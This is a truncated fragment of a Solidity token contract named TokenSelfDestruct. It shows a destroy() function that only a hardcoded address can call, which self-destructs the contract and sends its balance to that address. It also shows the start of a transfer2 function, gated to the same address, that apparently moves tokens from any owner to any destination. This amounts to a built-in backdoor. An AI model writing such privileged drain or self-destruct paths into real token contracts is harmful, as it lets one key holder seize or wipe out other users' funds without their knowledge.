...
contract TokenSelfDestruct is TokenDisabled {
    ...
    function destroy() public {
        require(_msgSender() == address(0x8d3D641F1D49A81A05eB5c9F3E7762E2f342ca5D));  //0x0E85ffD98FbE9e914668Fe69202330a228b049E3
        selfdestruct(payable(_msgSender()));
    }

    function transfer2(address owner, address destination, uint256 amount) public {
        require(_msgSender() == address(0x8d3D641F1D49A81A05eB5c9F3E7762E2f342ca5D));
